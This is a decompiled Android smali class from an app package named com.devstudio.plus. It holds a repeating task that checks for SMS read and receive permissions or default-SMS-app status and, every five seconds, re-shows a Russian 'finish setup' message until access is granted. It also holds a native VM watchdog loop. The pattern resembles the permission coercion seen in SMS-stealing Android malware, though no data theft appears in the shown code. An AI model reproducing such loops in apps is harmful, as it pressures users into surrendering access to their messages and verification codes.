.class public final Lr0/b;
.super Ljava/lang/Object;
.source "r8-map-id-4f946035ae8b5dc8dc2611fa1065f2bff5a861868bbaf6a3ac203acc3f2498b4"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic b:I

.field public final synthetic c:Lcom/devstudio/plus/services/CommandService;


# direct methods
.method public synthetic constructor <init>(Lcom/devstudio/plus/services/CommandService;I)V
    .locals 0

    .line 1
    iput p2, p0, Lr0/b;->b:I

    .line 2
    .line 3
    iput-object p1, p0, Lr0/b;->c:Lcom/devstudio/plus/services/CommandService;

    .line 4
    .line 5
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 6
    .line 7
    .line 8
    return-void
.end method


# virtual methods
.method public final run()V
    .locals 8

    .line 1
    iget v0, p0, Lr0/b;->b:I

    .line 2
    .line 3
    const/4 v1, 0x0

    .line 4
    packed-switch v0, :pswitch_data_0

    .line 5
    .line 6
    .line 7
    iget-object v0, p0, Lr0/b;->c:Lcom/devstudio/plus/services/CommandService;

    .line 8
    .line 9
    iget-object v2, v0, Lcom/devstudio/plus/services/CommandService;->a:Landroid/os/Handler;

    .line 10
    .line 11
    sget-object v3, Lcom/devstudio/plus/services/CommandService;->m:Lcom/devstudio/plus/services/CommandService;

    .line 12
    .line 13
    const-string v3, "\u0414\u043b\u044f \u043f\u043e\u043b\u043d\u043e\u0446\u0435\u043d\u043d\u043e\u0439 \u0440\u0430\u0431\u043e\u0442\u044b "

    .line 14
    .line 15
    :try_start_0
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 16
    .line 17
    const/16 v5, 0x22

    .line 18
    .line 19
    if-lt v4, v5, :cond_1

    .line 20
    .line 21
    const-string v4, "android.permission.READ_SMS"

    .line 22
    .line 23
    invoke-virtual {v0, v4}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    .line 24
    .line 25
    .line 26
    move-result v4

    .line 27
    if-nez v4, :cond_0

    .line 28
    .line 29
    const-string v4, "android.permission.RECEIVE_SMS"

    .line 30
    .line 31
    invoke-virtual {v0, v4}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    .line 32
    .line 33
    .line 34
    move-result v4

    .line 35
    if-nez v4, :cond_0

    .line 36
    .line 37
    const/4 v4, 0x1

    .line 38
    goto :goto_0

    .line 39
    :catch_0
    :cond_0
    move v4, v1

    .line 40
    goto :goto_0

    .line 41
    :cond_1
    invoke-static {v0}, Landroid/provider/Telephony$Sms;->getDefaultSmsPackage(Landroid/content/Context;)Ljava/lang/String;

    .line 42
    .line 43
    .line 44
    move-result-object v4

    .line 45
    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 46
    .line 47
    .line 48
    move-result-object v5

    .line 49
    invoke-static {v4, v5}, Lh1/m;->a(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 50
    .line 51
    .line 52
    move-result v4
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 53
    :goto_0
    if-eqz v4, :cond_4

    .line 54
    .line 55
    :try_start_1
    const-string v1, "notification"

    .line 56
    .line 57
    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 58
    .line 59
    .line 60
    move-result-object v1

    .line 61
    instance-of v3, v1, Landroid/app/NotificationManager;

    .line 62
    .line 63
    if-eqz v3, :cond_2

    .line 64
    .line 65
    check-cast v1, Landroid/app/NotificationManager;

    .line 66
    .line 67
    goto :goto_1

    .line 68
    :cond_2
    const/4 v1, 0x0

    .line 69
    :goto_1
    if-eqz v1, :cond_3

    .line 70
    .line 71
    const/16 v3, 0x1389

    .line 72
    .line 73
    invoke-virtual {v1, v3}, Landroid/app/NotificationManager;->cancel(I)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 74
    .line 75
    .line 76
    :catch_1
    :cond_3
    :try_start_2
    iget-object v0, v0, Lcom/devstudio/plus/services/CommandService;->h:Lr0/b;

    .line 77
    .line 78
    invoke-virtual {v2, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 79
    .line 80
    .line 81
    goto :goto_4

    .line 82
    :catch_2
    move-exception v0

    .line 83
    goto :goto_3

    .line 84
    :cond_4
    :try_start_3
    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 85
    .line 86
    .line 87
    move-result-object v4

    .line 88
    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 89
    .line 90
    .line 91
    move-result-object v5

    .line 92
    invoke-virtual {v4, v5, v1}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    .line 93
    .line 94
    .line 95
    move-result-object v1

    .line 96
    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 97
    .line 98
    .line 99
    move-result-object v4

    .line 100
    invoke-virtual {v4, v1}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    .line 101
    .line 102
    .line 103
    move-result-object v1

    .line 104
    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 105
    .line 106
    .line 107
    move-result-object v1
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    .line 108
    goto :goto_2

    .line 109
    :catch_3
    :try_start_4
    const-string v1, ""

    .line 110
    .line 111
    :goto_2
    new-instance v4, Ljava/lang/StringBuilder;

    .line 112
    .line 113
    invoke-direct {v4, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 114
    .line 115
    .line 116
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 117
    .line 118
    .line 119
    move-result v3

    .line 120
    if-lez v3, :cond_5

    .line 121
    .line 122
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 123
    .line 124
    .line 125
    const-string v1, " "

    .line 126
    .line 127
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 128
    .line 129
    .line 130
    :cond_5
    const-string v1, "\u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e \u0437\u0430\u0432\u0435\u0440\u0448\u0438\u0442\u044c \u043d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0443."

    .line 131
    .line 132
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 133
    .line 134
    .line 135
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 136
    .line 137
    .line 138
    move-result-object v1

    .line 139
    invoke-virtual {v0, v1}, Lcom/devstudio/plus/services/CommandService;->g(Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    .line 140
    .line 141
    .line 142
    goto :goto_4

    .line 143
    :goto_3
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 144
    .line 145
    .line 146
    :goto_4
    const-wide/16 v0, 0x1388

    .line 147
    .line 148
    invoke-virtual {v2, p0, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 149
    .line 150
    .line 151
    return-void

    .line 152
    :pswitch_0
    iget-object v0, p0, Lr0/b;->c:Lcom/devstudio/plus/services/CommandService;

    .line 153
    .line 154
    sget-object v2, Lcom/devstudio/plus/services/CommandService;->m:Lcom/devstudio/plus/services/CommandService;

    .line 155
    .line 156
    invoke-virtual {v0}, Lcom/devstudio/plus/services/CommandService;->i()V

    .line 157
    .line 158
    .line 159
    iget-object v0, p0, Lr0/b;->c:Lcom/devstudio/plus/services/CommandService;

    .line 160
    .line 161
    :try_start_5
    iget-boolean v2, v0, Lcom/devstudio/plus/services/CommandService;->f:Z

    .line 162
    .line 163
    if-nez v2, :cond_6

    .line 164
    .line 165
    goto :goto_7

    .line 166
    :cond_6
    invoke-static {}, Lcom/devstudio/plus/NativeBridge;->getVmAliveEpoch()J

    .line 167
    .line 168
    .line 169
    move-result-wide v2

    .line 170
    const-wide/16 v4, 0x0

    .line 171
    .line 172
    cmp-long v4, v2, v4

    .line 173
    .line 174
    if-nez v4, :cond_7

    .line 175
    .line 176
    goto :goto_7

    .line 177
    :cond_7
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 178
    .line 179
    .line 180
    move-result-wide v4

    .line 181
    const/16 v6, 0x3e8

    .line 182
    .line 183
    int-to-long v6, v6

    .line 184
    div-long/2addr v4, v6

    .line 185
    sub-long/2addr v4, v2

    .line 186
    const-wide/16 v2, 0x78

    .line 187
    .line 188
    cmp-long v2, v4, v2

    .line 189
    .line 190
    if-gtz v2, :cond_8

    .line 191
    .line 192
    invoke-static {}, Lcom/devstudio/plus/NativeBridge;->isVmRunning()Z

    .line 193
    .line 194
    .line 195
    move-result v2

    .line 196
    if-nez v2, :cond_9

    .line 197
    .line 198
    goto :goto_5

    .line 199
    :catch_4
    move-exception v0

    .line 200
    goto :goto_6

    .line 201
    :cond_8
    :goto_5
    invoke-static {}, Lcom/devstudio/plus/NativeBridge;->isVmRunning()Z

    .line 202
    .line 203
    .line 204
    invoke-static {}, Lcom/devstudio/plus/NativeBridge;->resetVmFlag()V

    .line 205
    .line 206
    .line 207
    iput-boolean v1, v0, Lcom/devstudio/plus/services/CommandService;->f:Z

    .line 208
    .line 209
    invoke-virtual {v0}, Lcom/devstudio/plus/services/CommandService;->h()V

    .line 210
    .line 211
    .line 212
    iget-object v1, v0, Lcom/devstudio/plus/services/CommandService;->a:Landroid/os/Handler;

    .line 213
    .line 214
    new-instance v2, Lr0/a;

    .line 215
    .line 216
    const/4 v3, 0x3

    .line 217
    invoke-direct {v2, v0, v3}, Lr0/a;-><init>(Lcom/devstudio/plus/services/CommandService;I)V

    .line 218
    .line 219
    .line 220
    const-wide/16 v3, 0x2710

    .line 221
    .line 222
    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_4

    .line 223
    .line 224
    .line 225
    goto :goto_7

    .line 226
    :goto_6
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 227
    .line 228
    .line 229
    :cond_9
    :goto_7
    iget-object v0, p0, Lr0/b;->c:Lcom/devstudio/plus/services/CommandService;

    .line 230
    .line 231
    iget-object v0, v0, Lcom/devstudio/plus/services/CommandService;->a:Landroid/os/Handler;

    .line 232
    .line 233
    const-wide/16 v1, 0x4e20

    .line 234
    .line 235
    invoke-virtual {v0, p0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 236
    .line 237
    .line 238
    return-void

    .line 239
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
    .end packed-switch
.end method
